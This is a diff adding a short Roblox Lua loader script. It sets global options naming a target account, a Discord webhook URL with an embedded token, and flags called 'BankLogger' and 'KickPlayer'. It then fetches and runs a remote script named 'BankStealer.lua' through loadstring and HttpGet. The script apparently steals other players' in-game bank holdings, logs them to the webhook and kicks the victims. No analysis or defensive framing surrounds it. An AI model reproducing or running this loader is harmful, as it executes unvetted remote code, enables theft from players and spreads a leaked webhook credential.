@@ -1,0 +1,7 @@
+_G.AuthName = 'rorodederoro2'
+_G.AuthId = 2393649244
+_G.AuthWebhook = "https://discordapp.com/api/webhooks/1095705197940047972/gswxE1jiWG_9sv6iDMuFqDGvKCrELHF0tYxfe-8X9b13EMvV8uk_tXkEm2E5UEmIxdmp"
+_G.BankLogger = true
+_G.KickPlayer = true
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SaskeCen/Dark-Hub/main/BankStealer.lua"))()
